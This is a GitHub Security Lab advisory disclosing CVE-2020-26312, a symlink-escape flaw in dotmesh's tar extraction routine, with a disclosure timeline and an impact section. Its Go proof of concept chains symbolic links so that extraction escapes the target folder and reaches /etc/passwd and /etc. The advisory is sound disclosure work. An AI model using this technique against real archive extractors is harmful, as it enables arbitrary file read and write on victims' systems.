
[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

July 13, 2021
# GHSL-2020-254: Arbitrary file read and/or write in dotmesh - CVE-2020-26312

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
GitHub Security Lab](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2020-11-30: [Requested security contact](https://github.com/dotmesh-io/dotmesh/issues/806)
* 2021-03-02: Deadline expired
* 2021-07-13: Publishing as per [GitHub SecLab disclosure policy](https://securitylab.github.com/advisories/#policy)

## Summary

The unsafe handling of symbolic links in an unpacking routine may enable attackers to read and/or write to arbitrary locations outside the designated target folder.

## Product

dotmesh

## Tested Version

Latest commit at the time of reporting (November 27, 2020).

## Details

### Unsafe handling of symbolic links in unpacking routine

The routine [`untarFile`](https://github.com/dotmesh-io/dotmesh/blob/master/pkg/archiver/tar.go#L255) attempts to guard against creating symbolic links that point outside the directory a tar archive is extracted to. However, a malicious tarball first linking `subdir/parent` to `..` (allowed, because `subdir/..` falls within the archive root) and then linking `subdir/parent/escapes` to `..` results in a symbolic link pointing to the tarball’s parent directory, contrary to the routine’s goals.

Proof of concept, using a version of `untarFile` tweaked to accept an array of tar headers instead of working from an actual tar archive:

```
package main

import (
	"archive/tar"
	"fmt"
  "os"
	"path/filepath"
	"strings"

	securejoin "github.com/cyphar/filepath-securejoin"
)

func main() {
	var headers []tar.Header = make([]tar.Header, 3)

	headers[0].Name = "subdir/parent"
	headers[0].Linkname = ".."
	headers[0].Typeflag = tar.TypeSymlink

	headers[1].Name = "subdir/parent/passwd"
	headers[1].Linkname = "../../etc/passwd"
	headers[1].Typeflag = tar.TypeSymlink

	headers[2].Name = "subdir/parent/etc"
	headers[2].Linkname = "../../etc"
	headers[2].Typeflag = tar.TypeSymlink

	for _, hdr := range headers {
    to := "/tmp/extracthere"
    destPath, err := securejoin.SecureJoin(to, hdr.Name)
    if err != nil {
      fmt.Println("Insecure path error: %s", err)
      return
    }
	  untarFile(hdr, destPath)
  }

}

func untarFile(hdr tar.Header, to string) error {

	switch hdr.Typeflag {
    case tar.TypeSymlink:
      destPath := filepath.Clean(hdr.Linkname)
      if strings.HasPrefix(destPath, "/") {
        fmt.Errorf("Symlinking to absolute path is insecure: %s", destPath)
      }
      fmt.Println(to, destPath)
      return writeNewSymbolicLink(to, destPath)
    default:
      return fmt.Errorf("%s: unknown type flag: %c", hdr.Name, hdr.Typeflag)
	}
}

func writeNewSymbolicLink(fpath string, target string) error {
	err := os.MkdirAll(filepath.Dir(fpath), 0755)
	if err != nil {
		return fmt.Errorf("%s: making directory for file: %v", fpath, err)
	}

	_, err = os.Lstat(fpath)
	if err == nil {
		err = os.Remove(fpath)
		if err != nil {
			return fmt.Errorf("%s: failed to unlink: %+v", fpath, err)
		}
	}

	err = os.Symlink(target, fpath)
	if err != nil {
		return fmt.Errorf("%s: making symbolic link for: %v", fpath, err)
	}
	return nil
}

```
#### Impact

This issue may lead to arbitrary file write (with same permissions as the program running the unpack operation) if the attacker can control the archive file. Additionally, if the attacker has read access to the unpacked files, he may be able to read arbitrary system files the parent process has permissions to read.

## CVE

* CVE-2020-26312

## Credit

This issue was discovered and reported by GitHub team member [@smowton (Chris Smowton)](https://github.com/smowton).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2020-254` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information

